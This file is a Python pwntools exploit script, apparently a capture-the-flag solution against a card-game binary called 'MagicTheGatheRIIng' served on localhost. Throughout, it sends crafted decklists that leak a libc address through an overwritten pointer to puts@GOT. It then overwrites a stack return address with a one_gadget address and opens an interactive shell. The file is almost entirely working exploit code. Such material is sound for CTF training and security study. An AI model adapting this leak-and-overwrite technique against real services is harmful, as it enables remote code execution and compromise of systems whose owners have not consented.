#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './MagicTheGatheRIIng'
libc = ELF("./MagicTheGatheRIIng-libc.so")
binary = ELF(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#PUTS_GOT_ADDR = 0x406020
PUTS_GOT_ADDR = binary.got["puts"]
log.info(f"{PUTS_GOT_ADDR=:#x}")
infoleak_decklist = "\n".join([
    # Overwrite string pointer in computer deck with power/toughness
    # Use to basically leak via puts(puts)
    f"21 m JUNK 14 {PUTS_GOT_ADDR} 0",
    "\n"
])


PROMPT = "> "
CARDS_PROMPT = "Enter cards:\n"

#io = start()
io = remote('localhost', 22002)
#input("WAIT")
#io = remote('localhost', 22002)
# Overwrite a string pointer in the CPU deck with address of puts@GOT
io.sendlineafter(PROMPT, "2")
io.sendlineafter(CARDS_PROMPT, infoleak_decklist)

# Play
io.sendlineafter(PROMPT, "4")

# Discard CPU first turn
io.recvuntil("Drew ")
# Discard Player first turn
io.recvuntil("Drew ")
# Wait for CPU second turn, which contains leak
io.recvuntil("Drew ")
words = io.recvline(keepends=False)
log.info(f'{words=}')
# Second printed card contains leak
# assert len(words) == 1, "Unexpected space in infoleak, try again"
assert len(words) >= 6, "Unexpected infoleak length, try again"
puts_addr = int.from_bytes(words[:6], "little")
log.info(f"{puts_addr=:#x}")
libc_base = puts_addr - libc.symbols['puts']
log.info(f"{libc_base=:#x}")

# Offset from puts to magic gadget
#MAGIC_GADGET_OFFSET = -0x30499
MAGIC_GADGET_OFFSET = 0xe3b34

magic_gadget_addr = libc_base + MAGIC_GADGET_OFFSET
exploit_decklist = "\n".join([
    # Overwrite retaddr on stack with power/toughness
    # Has to have mana cost of 0 and be mana (not creature) so RBP will be null for the one_gadget
    f"45 m EXPLOIT 0 {magic_gadget_addr & 0xFFFFFFFF} {magic_gadget_addr >> 32}",
    #f"45 m EXPLOIT 13 5 5",
    # End reading
    "\n"
])

# Wait for the game to finish, then send exploit
io.sendlineafter(PROMPT, "2")
io.sendlineafter(CARDS_PROMPT, exploit_decklist)

# Exit, triggering the exploit and one_gadget
io.sendlineafter(PROMPT, "5")

io.interactive()

